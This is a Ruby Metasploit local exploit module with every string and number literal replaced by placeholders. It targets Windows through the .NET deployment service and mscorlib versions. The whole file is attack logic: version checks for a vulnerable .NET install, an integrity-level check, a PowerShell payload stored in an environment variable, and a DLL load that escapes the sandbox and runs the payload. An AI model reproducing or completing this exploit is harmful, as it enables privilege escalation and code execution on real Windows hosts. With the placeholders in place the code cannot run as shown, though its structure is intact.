require <str> require <str> require <str> require <str> class Metasploit3 < Msf :: Exploit :: Local Rank = GreatRanking include Msf :: Exploit :: Powershell include Msf :: Exploit :: EXE include Msf :: Post :: Windows :: Priv include Msf :: Post :: Windows :: FileInfo include Msf :: Post :: File NET_VERSIONS = { <str> = > { <str> = > <str> , <str> = > <str> } , <str> = > { <str> = > <str> , <str> = > <str> } } def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ [ <str> , { } ] ] , <str> = > <int> , <str> = > { <str> = > <int> } , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] ) ) end def check unless file_exist? ( <str> get_env ( <str> ) <str> ) return Exploit :: CheckCode :: Unknown end net_version = get_net_version if net_version . empty? return Exploit :: CheckCode :: Unknown end unless file_exist? ( <str> get_env ( <str> ) <str> ) return Exploit :: CheckCode :: Detected end mscorlib_version = get_mscorlib_version if Gem :: Version . new ( mscorlib_version ) > = Gem :: Version . new ( NET_VERSIONS [ net_version ] [ <str> ] ) return Exploit :: CheckCode :: Safe end Exploit :: CheckCode :: Appears end def get_net_version net_version = <str> dfsvc_version = file_version ( <str> get_env ( <str> ) <str> ) dfsvc_version = dfsvc_version . join ( <str> ) NET_VERSIONS . each do | k , v | if v [ <str> ] == dfsvc_version net_version = k end end net_version end def get_mscorlib_version mscorlib_version = file_version ( <str> get_env ( <str> ) <str> ) mscorlib_version . join ( <str> ) end def exploit print_status ( <str> sysinfo [ <str> ] <str> ) unless sysinfo . nil? mod_handle = session . railgun . kernel32 . GetModuleHandleA ( <str> ) if mod_handle [ <str> ] == <int> fail_with ( Failure :: NotVulnerable , <str> ) end unless get_integrity_level == INTEGRITY_LEVEL_SID [ <str> ] fail_with ( Failure :: NotVulnerable , <str> ) end print_status ( <str> ) unless file_exist? ( <str> get_env ( <str> ) <str> ) fail_with ( Failure :: NotVulnerable , <str> ) end net_version = get_net_version if net_version . empty? fail_with ( Failure :: NotVulnerable , <str> ) end print_good ( <str> net_version <str> ) print_status ( <str> ) unless file_exist? ( <str> get_env ( <str> ) <str> ) fail_with ( Failure :: NotVulnerable , <str> ) end mscorlib_version = get_mscorlib_version if Gem :: Version . new ( mscorlib_version ) > = Gem :: Version . new ( NET_VERSIONS [ net_version ] [ <str> ] ) fail_with ( Failure :: NotVulnerable , <str> ) end print_good ( <str> ) cmd = cmd_psh_payload ( payload . encoded , payload_instance . arch . first , { <str> = > true } ) cmd . gsub! ( <str> , <str> ) session . railgun . kernel32 . SetEnvironmentVariableA ( <str> , cmd ) temp = get_env ( <str> ) print_status ( <str> ) session . core . load_library ( <str> = > :: File . join ( Msf :: Config . data_directory , <str> , <str> , <str> ) , <str> = > temp + <str> , <str> = > true , <str> = > false , <str> = > false ) end def cleanup session . railgun . kernel32 . SetEnvironmentVariableA ( <str> , nil ) super end end 
